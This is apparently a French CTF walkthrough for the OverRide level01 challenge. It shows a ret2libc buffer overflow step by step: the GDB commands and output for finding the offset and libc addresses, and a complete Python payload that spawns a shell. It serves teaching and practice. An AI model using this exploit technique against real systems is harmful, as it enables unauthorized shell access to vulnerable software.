# Walkthrough – OverRide level01 (ret2libc)

## 1️⃣ Trouver l’offset de retour (EIP)

Pour déterminer la taille exacte du buffer overflow sur le champ `password`, on utilise un **pattern cyclique**.

```bash
./pattern_generator.py 100
```

On injecte ce pattern comme mot de passe :

```bash
(gdb) r < <(python -c 'print("dat_wil")';             python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")')
```

Crash observé :

```text
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

On retrouve l’offset exact correspondant à la valeur écrasée dans EIP :

```bash
./pattern_generator.py --offset 37634136
Exact match at offset 80
```

✅ **Offset du retour (EIP) = 80 octets**

---

## 2️⃣ Récupération des adresses utiles (ret2libc)

On travaille **dans GDB**, car les adresses de la libc doivent être celles **chargées en runtime**.

### Adresse de `system()` et `exit()`

```gdb
(gdb) p system
$1 = 0xf7e6aed0 <system>

(gdb) p exit
$2 = 0xf7e5eb70 <exit>
```

---

### Adresse de `/bin/sh`

On identifie d’abord la plage mémoire de la libc :

```gdb
(gdb) info proc map
```

Segment libc exécutable :

```text
0xf7e2c000 - 0xf7fcc000  /lib32/libc-2.15.so
```

Puis on recherche la chaîne `/bin/sh` directement en mémoire :

```gdb
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Vérification :

```gdb
(gdb) x/s 0xf7f897ec
"/bin/sh"
```

---

### 📌 Récapitulatif des valeurs

```text
Offset EIP          : 80
system()            : 0xf7e6aed0
exit()              : 0xf7e5eb70
"/bin/sh"           : 0xf7f897ec
```

---

## 3️⃣ Construction du payload ret2libc

Convention de pile (x86 32-bit) :

```text
[ padding ][ system ][ exit ][ "/bin/sh" ]
```

Payload final :

```bash
(python -c 'print("dat_wil")';  python -c 'print(
   "A"*80 +
   "\xf7\xe6\xae\xd0"[::-1] +
   "\xf7\xe5\xeb\x70"[::-1] +
   "\xf7\xf8\x97\xec"[::-1]
 )'; cat) | ./level01
```

Résultat :

```text
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
```

🎉 **Shell obtenu avec succès**

---

## 4️⃣ Méthodes alternatives pour trouver les adresses

### A) Via `ldd` (indicatif uniquement)

⚠️ `ldd` donne une **approximation** (loader séparé), utile pour comprendre mais **pas fiable à 100%**.

```bash
ldd level01
libc.so.6 => /lib32/libc.so.6 (0xf7e4e000)
```

---

### B) Offsets statiques dans la libc

```bash
readelf -s /lib32/libc.so.6 | grep system
```

```text
0003eed0 system@@GLIBC_2.0
```

```bash
strings -tx /lib32/libc.so.6 | grep "/bin/sh"
```

```text
15d7ec /bin/sh
```

Les adresses runtime peuvent alors être reconstruites par :

```text
addr = libc_base + offset
```

👉 **Mais la méthode `find` dans GDB reste la plus fiable.**

---

## 🧠 Points clés à retenir

- `system` est une **fonction** → vérifier avec `x/i`
- `/bin/sh` est une **string** → vérifier avec `x/s`
- Toujours récupérer la **base libc en runtime**
- `exit()` n’est pas strictement obligatoire, mais évite les crashs post-shell
- ret2libc = **offsets statiques + base dynamique**
